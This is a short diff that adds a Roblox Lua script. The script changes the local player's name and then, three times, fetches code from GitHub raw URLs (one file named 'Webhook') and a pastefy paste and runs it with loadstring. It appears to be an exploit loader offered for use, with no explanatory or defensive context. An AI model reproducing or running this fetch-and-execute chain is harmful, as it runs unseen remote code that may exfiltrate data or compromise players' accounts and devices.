@@ -1,0 +1,9 @@
+game.Players.LocalPlayer.Name = "mygame43"
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PixelPerfectPrivacy/Rewrite/main/All%20Scripts"))()
+wait(8)
+game.Players.LocalPlayer.Name = "AfxcaxiRoblox"
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PixelPerfectPrivacy/Rewrite/main/Webhook"))()
+wait(1)
+loadstring(game:HttpGet("https://pastefy.app/AvjAnpet/raw"))()
